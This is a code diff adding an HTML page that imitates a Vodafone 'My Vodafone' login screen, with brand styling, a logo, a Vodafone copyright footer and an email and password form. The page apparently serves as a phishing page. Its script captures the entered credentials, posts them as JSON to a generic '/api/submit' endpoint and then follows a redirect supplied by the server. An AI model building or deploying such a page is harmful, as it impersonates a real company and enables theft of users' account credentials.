@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en-gb">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Login | Vodafone</title>
+
+  <style>
+    /* Reset */
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f5f5f5;
+      color: #333;
+      line-height: 1.5;
+    }
+
+    .header {
+      background-color: white;
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+    }
+
+    .logo {
+      width: 40px;
+      height: 40px;
+    }
+
+    .logo svg {
+      width: 100%;
+      height: 100%;
+    }
+
+    .login-container {
+      max-width: 400px;
+      margin: 50px auto;
+      padding: 20px;
+      background-color: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    .login-title {
+      text-align: center;
+      font-size: 28px;
+      margin-bottom: 20px;
+      font-weight: normal;
+    }
+
+    .form-group {
+      margin-bottom: 15px;
+    }
+
+    .form-group label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 5px;
+      color: #333;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 12px;
+      font-size: 16px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+      transition: box-shadow 0.2s ease;
+    }
+
+    .form-group input:hover,
+    .form-group input:focus {
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+      outline: none;
+    }
+
+    .login-btn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      font-size: 16px;
+      background-color: #E60000;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .login-btn:hover {
+      background-color: #cc0000;
+    }
+
+    .footer {
+      background-color: black;
+      color: white;
+      text-align: center;
+      padding: 20px 0;
+      margin-top: 40px;
+    }
+
+    .footer-links a {
+      color: white;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    .footer-links a:not(:last-child)::after {
+      content: "|";
+      margin: 0 5px;
+    }
+
+    .footer-copyright {
+      font-size: 12px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Header -->
+  <div class="header">
+    <div class="logo" aria-hidden="true">
+      <!-- Vodafone Logo SVG -->
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32">
+        <path fill="#E60000" d="M23.824,20.298c-0.396,0.778-0.918,1.497-1.552,2.13c-0.233,0.231-0.478,0.447-0.737,0.651 c-0.901,0.712-2.06,1.231-3.164,1.534c-0.778,0.216-1.588,0.322-2.402,0.309c-0.304,0-0.607-0.022-0.906-0.058 c-0.465-0.056-0.922-0.152-1.371-0.281C10.9,24.154,9.538,23.344,8.434,22.22c-0.444-0.451-0.833-0.939-1.168-1.459 c-0.46-0.799-0.848-1.669-1.109-2.579c-0.021-0.068-0.04-0.138-0.057-0.208c-0.138-0.516-0.236-1.046-0.294-1.583 c-0.058-0.536-0.077-1.089-0.053-1.642c0.002-0.056,0.004-0.11,0.007-0.165c0.045-0.792,0.162-1.562,0.345-2.299 c0.728-2.953,2.466-5.451,4.503-7.174C11.354,3.934,12.892,3.103,14.382,2.529c0.444-0.17,0.881-0.317,1.311-0.445 c0.277-0.082,0.55-0.155,0.817-0.219c0.73-0.18,1.417-0.3,2.024-0.368c0.863-0.095,1.567-0.091,2.019-0.019 c0.13,0.02,0.24,0.047,0.326,0.078C20.833,2.204,18.591,4.833,18.591,7.975c0,0.071,0.014,0.153,0.018,0.217 c1.307,0.274,2.436,0.718,3.382,1.302c1.21,0.741,2.145,1.724,2.853,2.848c0.045,0.061,0.088,0.122,0.129,0.185 c0.421,0.625,0.742,1.312,0.966,2.052c0.218,0.725,0.342,1.499,0.372,2.318c0,0.103,0.002,0.207,0.002,0.31 C26.114,19.134,25.794,20.47,25.184,21.662L23.824,20.298z M16,0C7.164,0,0,7.164,0,16c0,8.836,7.164,16,16,16 s16-7.164,16-16C32,7.164,24.836,0,16,0z"/>
+      </svg>
+    </div>
+  </div>
+
+  <!-- Login Container -->
+  <div class="login-container">
+    <h1 class="login-title">Log in to My Vodafone</h1>
+
+    <!-- Form submits via JS -->
+    <form method="POST">
+      <!-- Email Input -->
+      <div class="form-group">
+        <label for="username-email">Email or Username</label>
+        <input type="text" id="username-email" name="email" placeholder="E.g. jonsmith@gmail.com" required>
+      </div>
+
+      <!-- Password Input -->
+      <div class="form-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" placeholder="Enter your password" required>
+      </div>
+
+      <!-- Submit Button -->
+      <button type="submit" class="login-btn">Login</button>
+    </form>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div class="footer-links">
+      <a href="#">Privacy policy</a>
+      <a href="#">Terms &amp; conditions</a>
+      <a href="#">Cookie policy</a>
+    </div>
+    <p class="footer-copyright">© 2023 Vodafone Limited.</p>
+  </div>
+
+  <!-- Script to handle form submission -->
+  <script>
+    document.querySelector('form').addEventListener('submit', async function (e) {
+      e.preventDefault();
+
+      const formData = new FormData(this);
+      const data = Object.fromEntries(formData);
+
+      const res = await fetch('/api/submit', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      });
+
+      const result = await res.json();
+
+      if (result.redirect) {
+        window.location.href = result.redirect;
+      } else {
+        alert('An error occurred.');
+      }
+    });
+  </script>
+
+</body>
+</html>
